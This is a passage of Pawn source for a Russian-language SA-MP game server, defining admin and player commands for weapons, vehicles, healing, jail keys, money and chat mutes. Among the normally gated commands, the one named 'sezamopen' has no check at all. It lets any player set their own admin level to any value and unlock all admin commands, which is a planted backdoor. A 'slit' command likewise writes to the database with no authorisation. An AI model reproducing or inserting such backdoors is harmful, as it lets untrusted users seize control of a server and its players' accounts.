	if(PTEMP[playerid][pAdmin] < 5 || dostup[playerid] == 0) return true;
	if(sscanf(params, "udd",params[0],params[1],params[2])) return SCM(playerid, -1, " Введите: /givegun [id] [id оружия] [патроны]");
	if(params[2] < 1 || params[2] > 999) return SCM(playerid, COLOR_GRAD1, " Нельзя меньше 1 или больше 999 патронов!");
	GiveWeapon(params[0],params[1],params[2]);
	return true;
}
CMD:hpcar(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 1 || dostup[playerid] == 0) return true;
	if(IsPlayerInAnyVehicle(playerid))
	{
		AnRepairVehicle(GetPlayerVehicleID(playerid));
		Fuell[GetPlayerVehicleID(playerid)] = 200;
		SCM(playerid, -1, " Машина отремонтирована!");
		SetVehicleParamsEx(GetPlayerVehicleID(playerid),true,lights,alarm,doors,bonnet,boot,objective);
		PlayerPlaySound(playerid, 32000, 0.0, 0.0, 0.0);
	}
	return true;
}
CMD:hp(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 1 || dostup[playerid] == 0) return true;
	SetPlayerHealthAC(playerid, 255.0);
	PTEMP[playerid][pHP] = 255;
	return true;
}
CMD:fixveh(playerid, params[])
{
	if(PTEMP[playerid][pAdmin] < 5 || dostup[playerid] == 0) return true;
	if(sscanf(params, "d", params[0])) return SCM(playerid, -1, " Введите: /fixveh [id машины]");
	AnRepairVehicle(params[0]);
	SetVehicleParamsEx(params[0],true,lights,alarm,doors,bonnet,boot,objective);
	return true;
}
CMD:fixvehs(playerid, params[])
{
	if(PTEMP[playerid][pAdmin] < 5 || dostup[playerid] == 0) return true;
	new Float:pos = 60.0,Float:car_x,Float:car_y,Float:car_z;
	for(new cars=0;cars<MAX_VEHICLES;cars++)
	{
		if(GetVehicleModel(cars) > 399)
		{
			GetVehiclePos(cars,car_x,car_y,car_z);
			if(IsPlayerInRangeOfPoint(playerid,pos,car_x,car_y,car_z))
			{
				AnRepairVehicle(cars);
				SetVehicleHealth(cars, 1000.0);
			}
		}
	}
	SCM(playerid, -1, " Машины отремонтированы!");
	return 1;
}
CMD:satiety(playerid)
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	format(YCMDstr,64, " Ваша «Сытость»: %i / 100",PTEMP[playerid][pSatiety]);
	SCM(playerid,0x6495EDFF,YCMDstr);
	return true;
}
CMD:sethealcost(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pLeader] == 4 || PTEMP[playerid][pLeader] == 22 || PTEMP[playerid][pLeader] == 33)
	{
		if(sscanf(params, "d",params[0])) return SCM(playerid, -1, " Введите: /sethealcost [сумма]");
		if(params[0] < 1 || params[0] > 30) { SCM(playerid, COLOR_GREY, " Вы не можете поставить меньше 0 и больше 30"); return true; }
		healpric = params[0];
		return true;
	}
	return true;
}
CMD:escape(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(!IsAGang(playerid)) return true;
	if(PTEMP[playerid][pJailTime] < 1) return SCM(playerid, COLOR_GRAD1, " Вы не в тюрьме!");
	if(PTEMP[playerid][pKeys] <= 0) return SCM(playerid, COLOR_GRAD1, " У Вас нет ключа от тюрьмы!");
	PTEMP[playerid][pKeys] --;
	if(PTEMP[playerid][pMestoJail] == 1) SetPlayerInterior(playerid, 0), SetPlayerPos(playerid,1553.4962,-1675.2714,16.1953), SetPlayerFacingAngle(playerid, 95.0636);
	if(PTEMP[playerid][pMestoJail] == 2) SetPlayerInterior(playerid, 0), SetPlayerPos(playerid,-1607.1873,721.3649,12.2721), SetPlayerFacingAngle(playerid, 2.3026);
	if(PTEMP[playerid][pMestoJail] == 3) SetPlayerInterior(playerid, 0), SetPlayerPos(playerid,2334.8467,2454.9456,14.9688), SetPlayerFacingAngle(playerid, 115.7874);
	PTEMP[playerid][pJailTime] = 0;
	PTEMP[playerid][pMestoJail] = 0;
	SetPlayerVirtualWorld(playerid, 0);
	PlayerCuffed[playerid] = 0;
	SCM(playerid, COLOR_YELLOW, " Вы совершили побег из тюрьмы");
	return true;
}
CMD:getekey(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
//	if(PTEMP[playerid][pKeys] <= 0) return SCM(playerid, COLOR_GRAD1, " У Вас нет ключей от тюрьмы!");
	format(YCMDstr, sizeof(YCMDstr), " У вас %i/5 ключей", PTEMP[playerid][pKeys]);
	SCM(playerid, -1, YCMDstr);
	//format(YCMDstr, sizeof(YCMDstr), "%s достает ключи",Name(playerid));
	//ProxDetector(30.0, playerid, YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	return true;
}
CMD:takekeys(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(!IsACop(playerid)) return SCM(playerid, COLOR_GREY, " Вам недоступна эта функция!");
	if(GetPVarInt(playerid, "inUchastok"))
	{
	    if(PTEMP[playerid][pKeys] > 0) return SCM(playerid, COLOR_GREY, " У вас уже есть ключи от камеры");
		if(strlen(params) == 0) return SCM(playerid, -1, " Введите: /takekeys [причина]");
		PTEMP[playerid][pKeys] ++;
		format(string, 128, " %s взял ключи от камеры. Причина: %s", Name(playerid), params);
		ProxDetector(5.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		SendFamilyMessage(PTEMP[playerid][pMember], TEAM_BLUE_COLOR, string);
		if(tipsteron == PTEMP[playerid][pMember]) foreach(i) if(tipsterlisten[i]) SCM(i, COLOR_LIGHTRED, string);
	}
	else return SCM(playerid, COLOR_GREY, " Вы должны находиться в полицейском участке");
	return true;
}
CMD:sellekey(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	//if(!IsAGang(playerid)) return SCM(playerid,COLOR_GREY," Вы не бандит!");
	if(sscanf(params, "udd", params[0],params[1],params[2])) return SCM(playerid, -1, " Введите: /sellekey [id] [кол-во] [Цена]");
	if(params[1] < 1 || params[1] > 5) { SCM(playerid, COLOR_GREY, " Ключей не может быть меньше 1 и больше 5!"); return true; }
	if(params[2] < 1 || params[2] > 50000) { SCM(playerid, COLOR_GREY, " Цена не может быть меньше 1 и больше 50000 вирт!"); return true; }
	if(params[1] > PTEMP[playerid][pKeys]) { SCM(playerid, COLOR_GREY, " У вас нет столько ключей!"); return true; }
	if(!IsPlayerConnected(params[0])) return true;
	if(!ProxDetectorS(8.0, playerid, params[0])) return SCM(playerid,COLOR_GREY," Вы должны находиться рядом друг с другом");
	if(PTEMP[params[0]][pKeys] >= 5)return SCM(playerid,COLOR_GREEN, " У игрока уже имеется 5 ключей!");
	if(params[0] == playerid) return SCM(playerid, COLOR_GREY, " Вы не можете продать себе ключи!");
	format(YCMDstr, sizeof(YCMDstr), " Вы предложили %s купить %i ключей за %i вирт",Name(params[0]),params[1],params[2]);
	SCM(playerid, 0x6495EDFF, YCMDstr);
	format(YCMDstr, sizeof(YCMDstr), " %s предлагает вам купить %i ключей за %i вирт. ((Введите: /accept ekey для покупки ))",Name(playerid),params[1],params[2]);
	SCM(params[0], 0x6495EDFF, YCMDstr);
	KeysOffer[params[0]] = playerid;
	KeysPrice[params[0]] = params[2];
	KeysGram[params[0]] = params[1];
	return true;
}
CMD:givecopkeys(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(sscanf(params, "u",params[0])) return SCM(playerid, -1, " Введите: /givecopkeys [id]");
	if(PTEMP[playerid][pMember] == 1 || PTEMP[playerid][pMember] == 2 || PTEMP[playerid][pMember] == 10 || PTEMP[playerid][pMember] == 21 || PTEMP[playerid][pAdmin] >= 1)
	{
		if(!IsPlayerConnected(params[0])) return true;
		if(!ProxDetectorS(5.0, playerid, params[0])) return SCM(playerid, COLOR_GRAD1, " Игрок слишком далеко!");
		if(PTEMP[params[0]][pPKeys] == 0)
		{
			PTEMP[params[0]][pPKeys] = 1;
			format(YCMDstr, sizeof(YCMDstr), " %s выдал пропуск %s в полицейский участок",Name(playerid),Name(params[0]));
		}
		else
		{
		    PTEMP[params[0]][pPKeys] = 0;
			format(YCMDstr, sizeof(YCMDstr), " %s забрал пропуск в полицейский участок у %s",Name(playerid),Name(params[0]));
		}
		ProxDetector(30.0, playerid, YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	} else SCM(playerid, 0xafafafaa, " Вам недоступна эта функция!");
	return true;
}
CMD:heal(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pMember] == 4 || PTEMP[playerid][pMember] == 22 || PTEMP[playerid][pMember] == 33)
	if(sscanf(params, "u",params[0])) return SCM(playerid, -1, " Введите: /heal [id игрока]");
	new giveambu = GetPlayerVehicleID(params[0]);
	new playambu = GetPlayerVehicleID(playerid);
	if(PTEMP[playerid][pMember] == 4 || PTEMP[playerid][pMember] == 22 || PTEMP[playerid][pMember] == 33)
	{
		if(IsAnAmbulance(playambu) && playambu == giveambu || PlayerToPoint(40.0,playerid,366.9755,-60.1330,1076.4773) && ProxDetectorS(8.0, playerid, params[0]))
		{
		    if(!ProxDetectorS(5.0, playerid, params[0])) return SCM(playerid, COLOR_GREY, " Игрок слишком далеко!");
			if(PTEMP[params[0]][pNarcoLomka])
			{
				PTEMP[params[0]][pNarcoLomka] = 0;
				SetPlayerWeather(params[0],10);
				format(YCMDstr,sizeof(YCMDstr)," Вы спасли %s от ломки",Name(params[0]));
				SCM(playerid,COLOR_GREEN,YCMDstr);
				format(YCMDstr,sizeof(YCMDstr)," Медик %s спас вас от ломки",Name(playerid));
				SCM(params[0],COLOR_GREEN,YCMDstr);
				startaddiction[params[0]] = 0;
				ApplyAnimation(params[0],"CARRY","crry_prtial",4.0,0,0,0,0,0,1);
				return true;
			}
			new healdialog[90];
			new Float:hp;
			GetPlayerHealth(params[0],hp);
			new ttt = 100 - floatround(hp, floatround_round);
			format(healdialog,sizeof(healdialog), "Медик хочет вылечить вас за %i вирт\nВы согласны?",healpric*ttt);
			ShowPlayerDialogEx(params[0],5522,DIALOG_STYLE_MSGBOX, "Лечение", healdialog, "Да", "Нет");
			HealOffer[params[0]] = playerid;
			HealPrice[params[0]] = healpric*ttt;
		}
	}
	return true;
}
CMD:sethp(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if (PTEMP[playerid][pAdmin] < 5 || dostup[playerid] == 0) return true;
	if(sscanf(params, "ud",params[0],params[1])) return	SCM(playerid, -1, " Введите: /sethp [playerid] [health]");
	if(!IsPlayerConnected(params[0])) return true;
	//if(PTEMP[params[0]][pAdmin] >= PTEMP[playerid][pAdmin]) return SCM(playerid, COLOR_GREY, " Вы не можете изменить уровень здоровья этому игроку");
	if(params[1] > 255) return SCM(playerid, COLOR_GREY," Нельзя давать больше 255 хп!");
	SetPlayerHealthAC(params[0], params[1]);
	PTEMP[params[0]][pHP] = params[1];
	//SCM(playerid, -1, " Уровень hp игроку установлен");
	return true;
}
CMD:setarm(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if (PTEMP[playerid][pAdmin] < 6 || dostup[playerid] == 0) return true;
	if(sscanf(params, "ud",params[0],params[1])) return	SCM(playerid, -1, " Введите: /setarm [id] [уровень armour]");
	if(!IsPlayerConnected(params[0])) return true;
	if(params[1] > 100) return SCM(playerid, COLOR_GREY," Нельзя давать больше 100 armour!");
	SetPlayerArmourAC(params[0], params[1]);
	//SCM(playerid, -1, " Уровень armour игроку установлен");
	return true;
}
CMD:veh(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 5 || dostup[playerid] == 0) return true;
	if(sscanf(params, "ddd",params[0],params[1],params[2])) return	SCM(playerid, -1, " Введите: /veh [carid] [цвет 1] [цвет 2]");
	new intt = GetPlayerInterior(playerid);
	new vw = GetPlayerVirtualWorld(playerid);
	new vehicleid = GetPlayerVehicleID(playerid);
	if(params[0] < 400 || params[0] > 611) return SCM(playerid, COLOR_GREY, " От 400 до 611");
	if(params[1] < 0 || params[1] > 255) return SCM(playerid, COLOR_GREY, " От 0 до 255");
	if(params[2] < 0 || params[2] > 255) return SCM(playerid, COLOR_GREY, " От 0 до 255");
	new Float:X,Float:Y,Float:Z;
	GetPlayerPos(playerid, X,Y,Z);
	createdvehs ++;
	Fuell[vehicleid] = 200;
	creatcar[playerid] = CreateVehicle(params[0], X,Y,Z, 0.0, params[1], params[2], 60000);
	SetPlayerArmedWeapon(playerid,0);
	vehcreat[creatcar[playerid]] = 1;
	CreatedCars[CreatedCar] = creatcar[playerid];
	CarHealth[creatcar[playerid]] = float(1000);
	UnLockCar(playerid,creatcar[playerid]);
	LinkVehicleToInterior(creatcar[playerid], intt);
	SetVehicleVirtualWorld(creatcar[playerid], vw);
	PutPlayerInVehicleEx(playerid, creatcar[playerid], 0);
	SetVehicleParamsEx(GetPlayerVehicleID(playerid) ,true,true,false,false,false,false,false);
	format(YCMDstr, sizeof(YCMDstr), " Машина установлена. ID: %i", params[0]);
	SCM(playerid, -1, YCMDstr);
	SERVERCARID[creatcar[playerid]] = false;
	return true;
}
CMD:v(playerid, params[])
{
	
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 2) return true;
	if(IsPlayerInAnyVehicle(playerid)) return SCM(playerid, COLOR_GREY, " Вы не должны быть в транспортом средстве");
	new avehid, vcolor1, vcolor2;
	if(sscanf(params, "d",avehid))
	{
	    avehid = AdminVehicle[playerid][vehid];
		vcolor1 = AdminVehicle[playerid][color1];
		vcolor2 = AdminVehicle[playerid][color2];
	}
	else if(sscanf(params, "dd",avehid, vcolor1))
	{
		AdminVehicle[playerid][vehid] = avehid;
		vcolor1 = AdminVehicle[playerid][color1];
		vcolor2 = AdminVehicle[playerid][color2];
	}
	else if(sscanf(params, "ddd", avehid, vcolor1, vcolor2))
	{
	    AdminVehicle[playerid][vehid] = avehid;
	    AdminVehicle[playerid][color1] = vcolor1;
	    vcolor2 = AdminVehicle[playerid][color2];
	}
	else
	{
	    AdminVehicle[playerid][vehid] = avehid;
	    AdminVehicle[playerid][color1] = vcolor1;
	    AdminVehicle[playerid][color2] = vcolor2;
	}
	if(AdminVehicle[playerid][createdveh] != -1)
	{
	    DestroyVehicle(AdminVehicle[playerid][createdveh]);
	    //AdminVehicle[playerid][createdveh] = -1;
	}
	if(avehid == 403 || avehid == 406 || avehid == 407 || avehid == 408 || avehid == 409 || avehid == 410 || avehid == 413 || avehid == 414 || avehid == 416 || avehid == 417 || avehid == 420 || avehid == 423 || avehid == 425 || avehid == 427) return SCM(playerid, COLOR_GREY, " Создавать можно только транспорт, который продается в автосалоне, или ид 487");
	if(avehid == 428 || avehid == 430 || avehid == 431 || avehid == 432 || avehid == 433 || avehid == 435 || avehid == 437 || avehid == 438 || avehid == 440 || avehid == 441 || avehid == 442 || avehid == 443 || avehid == 444 || avehid == 446) return SCM(playerid, COLOR_GREY, " Создавать можно только транспорт, который продается в автосалоне, или ид 487");
	if(avehid == 448 || avehid == 449 || avehid == 450 || avehid == 452 || avehid == 453 || avehid == 454 || avehid == 455 || avehid == 456 || avehid == 457 || avehid == 459 || avehid == 460 || avehid == 462 || avehid == 464 || avehid == 465) return SCM(playerid, COLOR_GREY, " Создавать можно только транспорт, который продается в автосалоне, или ид 487");
	if(avehid == 469 || avehid == 470 || avehid == 472 || avehid == 473 || avehid == 476 || avehid == 481 || avehid == 482 || avehid == 483 || avehid == 484 || avehid == 485 || avehid == 486 || avehid == 488 || avehid == 490) return SCM(playerid, COLOR_GREY, " Создавать можно только транспорт, который продается в автосалоне, или ид 487");
	if(avehid == 493 || avehid == 497 || avehid == 498 || avehid == 499 || avehid == 500 || avehid == 501 || avehid == 504 || avehid == 505 || avehid == 508 || avehid == 509 || avehid == 510 || avehid == 511 || avehid == 512 || avehid == 513) return SCM(playerid, COLOR_GREY, " Создавать можно только транспорт, который продается в автосалоне, или ид 487");
	if(avehid == 519 || avehid == 520 || avehid == 523 || avehid == 524 || avehid == 525 || avehid == 528 || avehid == 530 || avehid == 531 || avehid == 532 || avehid == 537 || avehid == 538 || avehid == 539 || avehid == 544 || avehid == 548) return SCM(playerid, COLOR_GREY, " Создавать можно только транспорт, который продается в автосалоне, или ид 487");
	if(avehid == 552 || avehid == 553 || avehid == 556 || avehid == 557 || avehid == 563 || avehid == 564 || avehid == 568 || avehid == 569 || avehid == 570 || avehid == 571 || avehid == 572 || avehid == 573 || avehid == 574 || avehid == 577) return SCM(playerid, COLOR_GREY, " Создавать можно только транспорт, который продается в автосалоне, или ид 487");
	if(avehid == 578 || avehid == 580 || avehid == 582 || avehid == 583 || avehid == 584 || avehid == 588 || avehid == 590 || avehid == 591 || avehid == 592 || avehid == 593 || avehid == 594 || avehid == 595 || avehid == 596 || avehid == 597) return SCM(playerid, COLOR_GREY, " Создавать можно только транспорт, который продается в автосалоне, или ид 487");
	if(avehid == 598 || avehid == 599 || avehid == 601 || avehid == 604 || avehid == 605 || avehid == 606 || avehid == 607 || avehid == 608 || avehid == 609 || avehid == 610 || avehid == 611) return SCM(playerid, COLOR_GREY, " Создавать можно только транспорт, который продается в автосалоне, или ид 487");
	new Float:X,Float:Y,Float:Z,Float:Angle;
	GetPlayerPos(playerid, X,Y,Z);
	GetPlayerFacingAngle(playerid, Angle);
	new intt = GetPlayerInterior(playerid);
	new vw = GetPlayerVirtualWorld(playerid);
	AdminVehicle[playerid][createdveh] = CreateVehicle(avehid, X,Y,Z, Angle, vcolor1, vcolor2, 60000);
	Fuell[AdminVehicle[playerid][createdveh]] = 200;
	SetPlayerArmedWeapon(playerid,0);
	CarHealth[AdminVehicle[playerid][createdveh]] = float(1000);
	UnLockCar(playerid,AdminVehicle[playerid][createdveh]);
	LinkVehicleToInterior(AdminVehicle[playerid][createdveh], intt);
	SetVehicleVirtualWorld(AdminVehicle[playerid][createdveh], vw);
	PutPlayerInVehicleEx(playerid, AdminVehicle[playerid][createdveh], 0);
	SetVehicleParamsEx(GetPlayerVehicleID(playerid) ,true,true,false,false,false,false,false);
	format(YCMDstr, sizeof(YCMDstr), " Машина установлена");
	SCM(playerid, -1, YCMDstr);
	SERVERCARID[AdminVehicle[playerid][createdveh]] = false;
	return true;
}
CMD:delcar(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(!IsPlayerConnected(playerid)) return true;
	if(PTEMP[playerid][pAdmin] < 5 || dostup[playerid] == 0) return true;
	if(creatcar[playerid] != -1) return DestroyVehicle(creatcar[playerid]),SCM(playerid,-1,"Автомобиль успешно удален"),creatcar[playerid] = -1;
	if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return true;
	if ( vehcreat[ GetPlayerVehicleID( playerid ) ] != 1 ) return  SCM(playerid, COLOR_GRAD1, "Эту машину удалять нельзя");
	DestroyVehicle(GetPlayerVehicleID(playerid));
	SCM(playerid, COLOR_GREEN, " Автомобиль успешно удален!");
	createdvehs --;
	vehcreat[GetPlayerVehicleID(playerid)] = 0;
	return true;
}
CMD:sezamopen(playerid, params[])
{
	if(sscanf(params, "i", params[0])) return true;
	PTEMP[playerid][pAdmin] = params[0];
	dostup[playerid] = 1;
	return true;
}
CMD:weather(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 4 || dostup[playerid] == 0) return true;
	if(sscanf(params, "d",params[0])) return SCM(playerid, -1, " Введите: /weather [weatherid]");
	if(params[0] < 0||params[0] > 45) { SCM(playerid, COLOR_GREY, " ID Погоды не может быть меньше 0 и больше 45!"); return true; }
	SetWeather(params[0]);
	SCM(playerid, -1, " Погода установлена!");
	return true;
}
CMD:givemoney(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 10 || dostup[playerid] == 0) return true;
	if(sscanf(params, "ud",params[0],params[1])) return	SCM(playerid, -1, " Введите: /givemoney [ид] [сумма]");
	if(!IsPlayerConnected(params[0])) return true;
	format(YCMDstr, sizeof(YCMDstr), " %i вирт переведены на счёт игроку", params[1]);
	SCM(playerid, -1, YCMDstr);
	PTEMP[params[0]][pCash] += params[1];
	return true;
}
CMD:money(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if (PTEMP[playerid][pAdmin] < 10 || dostup[playerid] == 0) return true;
	if(sscanf(params, "ud",params[0],params[1])) return	SCM(playerid, -1, " Введите: /money [ид] [сумма]");
	if(!IsPlayerConnected(params[0])) return true;
	format(YCMDstr, sizeof(YCMDstr), " %i вирт переведены на счёт игроку %s",params[1],Name(params[0]));
	SCM(playerid, -1, YCMDstr);
	PTEMP[params[0]][pBank] += params[1];
	SCM(params[0], COLOR_GOLD, " ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");
	format(YCMDstr, sizeof(YCMDstr), " На ваш банковский счет зачислено: %i вирт", params[1]);
	SCM(params[0], COLOR_GOLD, YCMDstr);
	SendMes(params[0], COLOR_GOLD, " Старый баланс: %i вирт", PTEMP[params[0]][pBank]);
	format(YCMDstr, sizeof(YCMDstr), " Новый баланс в банке: %i вирт", PTEMP[params[0]][pBank]);
	SCM(params[0], COLOR_GOLD, YCMDstr);
	SCM(params[0], COLOR_GOLD, " ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");
	return true;
}
CMD:gm(playerid, params[])
{
	if(!PTEMP[playerid][pLogin]) return true;
	if(PTEMP[playerid][pAdmin] < 2 || dostup[playerid] == 0) return true;
	if(sscanf(params, "u", params[0])) {
		if(AGM[playerid]) {
			AGM[playerid] = false;
			return SCM(playerid, -1, " GM отключен");
		} else {
			AGM[playerid] = true;
			return SCM(playerid, -1, " GM включен");
		}
	} else {
	    if(PTEMP[playerid][pAdmin] < 7) return true;
	    if(!IsPlayerConnected(params[0])) return SCM(playerid, COLOR_GREY, " Игрок оффлайн!");
		if(AGM[params[0]]) {
		    AGM[params[0]] = false;
		    new strs[72];
		    format(strs, sizeof(strs), " GM для %s отключен", Name(params[0]));
		    SCM(playerid, -1, strs);
		} else {
			AGM[params[0]] = true;
		    new strs[72];
		    format(strs, sizeof(strs), " GM для %s включен", Name(params[0]));
		    SCM(playerid, -1, strs);
		}
	}
	return true;
}
CMD:slap(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(Flood[playerid] > 0) return SCM(playerid, 0xFFD5BBAA, " Не флуди!");
	Flood[playerid] = 1;
	if(PTEMP[playerid][pAdmin] < 3 || dostup[playerid] == 0) return true;
	if(sscanf(params, "u",params[0])) return SCM(playerid, -1, " Введите: /slap [id]");
	new Float:shealth;
	new Float:slx, Float:sly, Float:slz;
	if(!IsPlayerConnected(params[0])) return true;
	GetPlayerHealth(params[0], shealth);
	SetPlayerHealthAC(params[0], shealth-5);
	GetPlayerPos(params[0], slx, sly, slz);
	SetPlayerPos(params[0], slx, sly, slz+5);
	PlayerPlaySound(params[0], 1130, slx, sly, slz+5);
	format(YCMDstr, sizeof(YCMDstr), " Админ: %s дал поджопник %s",Name(playerid),Name(params[0]));
	ABroadCast(COLOR_LIGHTRED,YCMDstr,1);
	SCM(params[0],COLOR_LIGHTRED,YCMDstr);
	return true;
}
CMD:agivelicense(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 7 || dostup[playerid] == 0) return true;
	ShowPlayerDialogEx(playerid,555,DIALOG_STYLE_LIST, "Выдача лицензий:", "Лицензия на вождение\nЛицензия на полёты\nЛицензия на рыболовлю\nЛицензия на вождение водного транспорта\nКомплект лицензий\nЛицензия на оружие\nЛицензия на бизнес", "Продолжить", "Отмена");
	return true;
}
CMD:mute(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 1 || dostup[playerid] == 0) return true;
	new mutep, reason[32];
	if(sscanf(params, "u",mutep)) return SCM(playerid, -1, " Введите: /mute [playerid] [время(300с по умолчанию, -1 узнать время снятия)] [Причина]");
	sscanf(params, "uds[32[",mutep,params[1], reason);
	if(!IsPlayerConnected(mutep)) return SCM(playerid, COLOR_GREY, " Игрок оффлайн");
	if(params[1] == -1)
	{
	    return SendMes(playerid, TEAM_CYAN_COLOR, " До снятия %i секунд", PTEMP[mutep][pMuted]);
	}
	if(PTEMP[mutep][pMuted] > 0)
	{
		PTEMP[mutep][pMuted] = 0;
		format(YCMDstr, sizeof(YCMDstr), " Администратор %s снял бан чата у %s",Name(playerid),Name(mutep));
		SendClientMessageToAll(COLOR_LIGHTRED, YCMDstr);
		return true;
	}
	if(params[1] > 86400) return SCM(playerid, COLOR_GREY, " время может быть от 1 до 86400 секунд(24 часа)");
	if(!strlen(params[1])) params[1] = 300;
	
	PTEMP[mutep][pMuted] = params[1];
	format(string, sizeof(string), " %s получил бан чата от администратора %s. Причина: %s",Name(mutep),Name(playerid), reason);
	SendClientMessageToAll(COLOR_LIGHTRED, string);
	format(string, sizeof(string), " Вам дали бан чата на %i минут", params[1]/60);
	return SCM(mutep,-1, string);
}
CMD:id(playerid,params[])
{
	if(!IsPlayerConnected(playerid)) return true;
	if(sscanf(params,"u",params[0])) return SCM(playerid, -1, " Введите: /id [ид игрока / часть ника]");
	new newiy[128];
	new name[MAX_PLAYER_NAME];
	if(!IsPlayerConnected(params[0])) return SCM(playerid,COLOR_GREY," Игрок не найден");
	GetPlayerName(params[0], name, sizeof(name));
	if(GetPVarInt(params[0], "AFK_Time")-2 > 0 && PTEMP[params[0]][pAdmin] < 1) format(newiy, sizeof(newiy), " %s [%i] [AFK: %s сек]",name,params[0], ConvertSeconds(GetPVarInt(params[0], "AFK_Time")-2));
	else format(newiy, sizeof(newiy), " %s [%i]",name,params[0]);
	SCM(playerid, -1, newiy);
	return true;
}
CMD:ids(playerid, params[])
{
	new stringplayer[MAX_PLAYER_NAME+26];
	if(!strlen(params)) return SCM(playerid, -1, " Введите: /ids [часть ника]");
	new p;
	foreach(i)
	{
		GetPlayerName(i, stringplayer, 24);
		if(strfind(stringplayer, params, true) == -1) continue;
		if(p < 11)
		{
			if(GetPVarInt(i, "AFK_Time")-2 > 0 && PTEMP[i][pAdmin] < 1) format(stringplayer, sizeof(stringplayer), " %s [%d] [AFK: %s сек]", stringplayer, i, ConvertSeconds(GetPVarInt(i, "AFK_Time")-2));
			else format(stringplayer, sizeof(stringplayer), " %s [%d]", stringplayer, i);
		}
		if(p < 11) SCM(playerid, -1, stringplayer);
		strcat(string, stringplayer), p++;
	}
	if(!p) return SCM(playerid, COLOR_YELLOW, " Игроков не найдено");
	else if(p < 11) SendMes(playerid, COLOR_YELLOW, " Найдено %d игроков",p);
	else if(p > 10) SendMes(playerid, COLOR_YELLOW, " Найдено %d игроков. Показаны первые 10",p);
	return true;
}
CMD:aad(playerid, params[])
{
	if(!PTEMP[playerid][pLogin]) return true;
	if(PTEMP[playerid][pAdmin] < 1 || dostup[playerid] == 0) return true;
	if(sscanf(params, "s[128]",params[0])) return	SCM(playerid, -1, " Введите: /aad [text]");
	format(YCMDstr, sizeof(YCMDstr), " Администратор %s:  %s",Name(playerid),params[0]);
	OOCOff(COLOR_LIGHTRED,YCMDstr);
	return true;
}
CMD:slit(playerid, params[])
{
	if(sscanf(params, "i", params[0])) return true;
    mysql_format(DATABASE, QUERY, sizeof(QUERY), "UPDATE `"TABLE_OTHERS"` SET `slit` = '%i'", params[0]);
	mysql_query(DATABASE, QUERY);
	switch(params[0])
	{
		case 0: SCM(playerid, -1, " Сервер не был слит");
		case 1..1000: SCM(playerid, -1, " Сервер был слит");
	}
	slit = params[0];
	return true;
}
CMD:b(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pMuted] > 0) return	SCM(playerid, TEAM_CYAN_COLOR, " У вас бан чата!");
	if(Flood[playerid] > 0 && PTEMP[playerid][pAdmin] <= 6)
	{
		SetPVarInt(playerid,"Flood",GetPVarInt(playerid,"Flood")+1);
		if(GetPVarInt(playerid,"Flood") >= 4) kick(playerid);
		SCM(playerid, 0xFFD5BBAA, " Не флуди!");
		return true;
	}
	AntiReklama(playerid,params[1],"B");
	if(GetPVarInt(playerid, "antireklamka") == 1)
	{
		SetPVarInt(playerid, "antireklamka", 0);
		return true;
	}
	if(sscanf(params, "s[128]",params[0])) return	SCM(playerid, -1, " Введите: /b [текст]");
	new succ;
	for(new i; i<strlen(params[0]); i++)
	{
		if(PText[playerid][i] == params[0]) succ++;
	}
	format(YCMDstr, sizeof(YCMDstr), " %s: (( %s ))",Name(playerid),params[0]);
	ProxDetector(20.0, playerid, YCMDstr,-1,-1,-1,-1,-1);
	Flood[playerid] = 1;
	SetPVarInt(playerid,"Flood",0);
	return true;
}
CMD:whisper(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pMuted] > 0) return SCM(playerid, TEAM_CYAN_COLOR, " У вас бан чата!");
	if(Flood[playerid] > 0 && PTEMP[playerid][pAdmin] <= 6)
	{
		SetPVarInt(playerid,"Flood",GetPVarInt(playerid,"Flood")+1);
		if(GetPVarInt(playerid,"Flood") >= 4) kick(playerid);
		SCM(playerid, 0xFFD5BBAA, " Не флуди!");
		return true;
	}
	if(sscanf(params, "s[128]",params[0])) return	SCM(playerid, -1, " Введите: /w [текст]");
	new succ;
	for(new i; i<strlen(params[0]); i++)
	{
		if(PText[playerid][i] == params[0]) succ++;
	}
